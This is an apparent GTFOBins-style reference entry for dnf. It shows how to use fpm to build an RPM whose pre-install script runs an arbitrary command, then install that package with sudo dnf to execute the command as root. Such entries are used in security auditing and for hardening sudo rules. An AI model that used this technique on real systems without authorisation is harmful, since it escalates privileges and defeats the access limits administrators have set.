---
type: gtfobin
name: dnf
platform: Unix
functions: [command]
tags: [gtfobin, unix, lotl]
---

# dnf

## command

```bash
dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
```
_Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install x.sh .
```

The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise._
**Contexts:** sudo
